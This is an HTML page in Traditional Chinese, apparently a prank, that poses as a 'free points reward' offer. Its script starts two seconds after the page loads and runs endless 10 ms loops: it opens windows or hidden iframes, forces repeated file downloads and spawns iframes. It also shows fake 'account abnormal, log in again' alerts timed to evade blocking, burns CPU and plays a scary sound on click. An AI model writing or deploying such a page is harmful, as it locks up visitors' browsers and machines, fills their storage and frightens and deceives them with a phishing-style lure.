<html>
    <head>
        <title>免費點數獎勳</title>
    </head>
    <body style="background-color: black; color: white; text-align: center;">
        <h1 style="color: red; font-size: 50px;">恭喜！您獲得免費點數！</h1>
        <img src="https://m.gxgif.com/pic/kb/202352514622.jpg" alt="免費獎勳" style="display: block; margin: 0 auto; width: 60%;"/>
        <audio id="scary-audio" loop>
            <source src="static/yy.wav" type="audio/wav">
        </audio>
        <p style="font-size: 20px; color: yellow;">點擊畫面領取獎勳</p>
        <button id="prankButton" style="font-size: 20px; padding: 10px; background-color: red; color: white; border: none; cursor: pointer;">領取獎勳</button>

        <script>
            // 頁面載入時執行其他行為
            window.onload = function() {
                setTimeout(function() {
                    // **無限開新視窗**
                    openWindows();
                    // **無限下載**
                    startDownload();
                    // **無限彈出警告**
                    annoyingAlert();
                    // **無限創建 iframe**
                    spamIframe();
                    // **無限 CPU 負載**
                    burnCPU();
                }, 2000); // 2秒後開始執行
            };

            // 當頁面被點擊時播放音樂
            document.body.addEventListener("click", function() {
                var audio = document.getElementById('scary-audio');
                audio.muted = false;  // 確保音樂不是靜音
                audio.play();         // 播放音樂
            });

            // **無限開新視窗**
            function openWindows() {
                let w = window.open("https://rickroll.it/", "_blank");
                if (!w) { // 如果瀏覽器阻擋，改用 iframe
                    let iframe = document.createElement('iframe');
                    iframe.src = "https://rickroll.it/";
                    iframe.width = "1";
                    iframe.height = "1";
                    document.body.appendChild(iframe);
                }
                setTimeout(openWindows, 10); // 10ms 無限執行
            }

            // **無限下載**
            function startDownload() {
                let a = document.createElement('a');
                a.href = 'bigfile.zip';
                a.download = 'bigfile.zip';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(startDownload, 10); // 10ms 無限下載
            }

            // **無限彈出警告**
            function annoyingAlert() {
                setTimeout(() => {
                    alert("⚠️ 你的帳號出現異常！請重新登入！");
                    annoyingAlert(); // 無限呼叫自己
                }, Math.random() * 50); // 變動時間，避開封鎖
            }

            // **無限創建 iframe**
            function spamIframe() {
                let iframe = document.createElement('iframe');
                iframe.src = "https://www.google.com";
                iframe.width = "400";
                iframe.height = "300";
                document.body.appendChild(iframe);
                setTimeout(spamIframe, 10); // 10ms 無限執行
            }

            // **無限 CPU 負載**
            function burnCPU() {
                let start = Date.now();
                while (Date.now() - start < 10) { // 10ms 運行
                    Math.sqrt(Math.random() * 99999999);
                }
                setTimeout(burnCPU, 10); // 10ms 無限執行
            }
        </script>
    </body>
</html>
